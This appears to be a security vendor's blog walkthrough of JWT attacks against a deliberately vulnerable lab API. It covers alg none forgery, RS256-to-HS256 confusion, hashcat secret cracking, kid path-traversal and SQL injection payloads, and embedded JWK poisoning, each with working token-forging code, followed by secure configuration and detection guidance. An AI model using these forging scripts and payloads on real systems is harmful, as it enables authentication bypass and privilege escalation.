JWT Security: From Algorithm Confusion to Full Authentication Bypass

A practical walkthrough of JWT vulnerabilities — none&alg confusion, weak secret brute-forcing, kid header injection, and JWK set poisoning. Each attack demonstrated in a lab environment, with detection strategies for each vector.

Apr 18, 2026 · 22 min read · Authentication · BlackShield Core Research
In This Post

JWT Structure and Trust Model

JSON Web Tokens encode claims in a Base64url-encoded header, payload, and signature — separated by dots. The security model depends entirely on two properties: the algorithm used to sign the token, and whether the server validates that algorithm against an allowed list rather than accepting whatever the token header specifies.

Most JWT vulnerabilities exist because libraries historically trusted the alg field in the token header, allowing attackers to choose the verification method. Modern libraries have tightened this, but misconfigured deployments remain common — especially in legacy applications and microservices where JWT handling is distributed across multiple services with inconsistent library versions.

Lab Environment

All attacks in this post were tested against a purposely vulnerable Node.js API using jsonwebtoken 8.5.x, a version representative of real-world deployments from 2019–2022. The lab target is available in the BlackShield Labs catalog.

Attack 1: Algorithm Confusion (alg: none and RS256→HS256)

The none Algorithm

The none algorithm signals that no signature is present. When a library accepts alg: none without explicit configuration to reject it, any token with an empty signature is accepted as valid. An attacker can modify any claim — user ID, role, expiry — and strip the signature entirely.

Forge a none-algorithm token 
# Original token (decoded header)
{"alg":"RS256","typ":"JWT"}

# Attacker modifies header to use none
{"alg":"none","typ":"JWT"}

# Modified payload (elevating privileges)
{"sub":"user_123","role":"admin","exp":9999999999}

# Forge the token: base64url(header).base64url(payload).
import base64, json

header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"user_123","role":"admin","exp":9999999999}).encode()).rstrip(b'=')
token   = header.decode() + '.' + payload.decode() + '.'
print(token)

# Result accepted by misconfigured server:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.

RS256 to HS256 Confusion

A subtler variant: when a server uses RS256 (asymmetric), it signs with a private key and verifies with a public key. If the attacker changes the algorithm to HS256 (symmetric), some libraries will use the public key — which is known — as the HMAC secret. The attacker signs with the server's public key and the token validates correctly.

RS256 → HS256 confusion attack 
# Fetch the server's public key (often exposed at /api/.well-known/jwks.json)
$ curl https://target.internal/api/.well-known/jwks.json | python3 -c "import sys,json; k=json.load(sys.stdin)['keys'][0]; print(k)"

# Forge token signed with public key using HS256
import jwt, requests

PUBLIC_KEY = open('server_public.pem').read()

forged = jwt.encode(
    {"sub": "admin_user", "role": "superadmin"},
    PUBLIC_KEY,
    algorithm="HS256"
)

# Server verifies: uses public key as HS256 secret — ACCEPTS
r = requests.get("https://target.internal/api/admin", headers={"Authorization": f"Bearer {forged}"})
print(r.status_code, r.json())
200 {"status": "ok", "user": "admin_user", "role": "superadmin"}

Attack 2: Weak Secret Brute-Force

HS256-signed tokens are only as secure as the secret. Developers frequently use short, predictable secrets — "secret", application names, or environment variable defaults. These are offline-crackable with standard wordlists in seconds.

Crack HS256 secret with hashcat 
# hashcat mode 16500 is dedicated to JWT cracking
$ hashcat -m 16500 -a 0 token.txt /usr/share/wordlists/rockyou.txt --show

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...:[CRACKED]:mysecretpassword

# With the secret, forge any token:
import jwt
forged = jwt.encode({"sub": "admin", "role": "superadmin"}, "mysecretpassword", algorithm="HS256")
print(forged)
Observation

In 3 out of 8 web application assessments in the past year, JWT secrets were crackable within 60 seconds using a standard wordlist. The most common offenders: "secret", the application's domain name, and defaults from popular boilerplate repositories.

Attack 3: kid Header Injection

The kid (Key ID) header field lets a server select which key to use for verification. If the value is passed unsanitized to a file read, database query, or system call, it becomes an injection vector. Two variants are common: path traversal and SQL injection.

kid path traversal — sign with /dev/null 
# Server reads key: fs.readFileSync(`./keys/${kid}`)
# Set kid to a known empty file — sign with empty string

header = {"alg": "HS256", "kid": "../../../../../../dev/null"}
# /dev/null reads as empty string — sign with ""
forged = jwt.encode(payload, "", algorithm="HS256", headers=header)

# kid SQL injection variant:
# SELECT secret FROM jwt_keys WHERE id = '{kid}'
# kid = "x' UNION SELECT 'attacker_controlled_secret'-- -"
header_sqli = {"alg": "HS256", "kid": "x' UNION SELECT 'pwned'-- -"}
forged_sqli = jwt.encode(payload, "pwned", algorithm="HS256", headers=header_sqli)

Attack 4: JWK Set Poisoning

Some JWT libraries support an embedded jwk header parameter — an inline JSON Web Key that the library uses for verification. If the library accepts inline JWKs without checking them against a trusted allowlist, an attacker can embed their own public key and sign the token with the corresponding private key.

JWK Set poisoning — embed attacker public key 
# 1. Generate attacker RSA keypair
$ openssl genrsa -out attacker.pem 2048
$ openssl rsa -in attacker.pem -pubout -out attacker_pub.pem

# 2. Export public key as JWK (use python-jwcrypto or similar)
from jwcrypto import jwk, jwt as jwcjwt

priv = jwk.JWK.from_pem(open('attacker.pem','rb').read())
pub_dict = priv.export_public(as_dict=True)

# 3. Embed attacker's public JWK in the token header
header = {"alg": "RS256", "jwk": pub_dict}
payload = {"sub": "admin", "role": "superadmin"}

# 4. Sign with attacker private key — server verifies with embedded public key
token = jwcjwt.JWT(header=header, claims=payload)
token.make_signed_token(priv)
print(token.serialize())

# Vulnerable server response:
200 {"user": "admin", "role": "superadmin"}

Detection and Defensive Engineering

Defending against JWT attacks requires both library configuration and runtime validation. Configuration mistakes are the root cause of most vulnerabilities; runtime monitoring catches what configuration misses.

Library Configuration (Node.js / jsonwebtoken)

Correct verification configuration 
// ✓ Always specify allowed algorithms explicitly
jwt.verify(token, publicKey, {
  algorithms: ['RS256'],   // never 'none', never ['RS256','HS256']
  issuer: 'https://auth.yourdomain.com',
  audience: 'https://api.yourdomain.com',
})

// ✗ Never do this — accepts any algorithm the token claims
jwt.decode(token, { complete: true })  // decode ≠ verify
jwt.verify(token, secret)                // no algorithm restriction

Runtime Detection Signals

  • Tokens arriving with alg: none or unexpected algorithm values — log and reject
  • Multiple authentication failures followed by a successful auth — possible brute-force or forgery
  • Tokens with kid values containing path separators (/, ..) or SQL metacharacters
  • Authentication from the same session with different sub or role claims
  • Tokens whose header contains an embedded jwk field — should be rejected unless explicitly supported

Tooling Used

  • hashcat — HS256 secret brute-forcing (mode 16500)
  • jwt_tool — comprehensive JWT manipulation and testing
  • Burp Suite — intercepting and modifying JWT tokens in transit
  • python-jose / PyJWT — token crafting in exploit scripts
  • BlackShield JWT Decoder — visual inspection and editing of JWT payloads
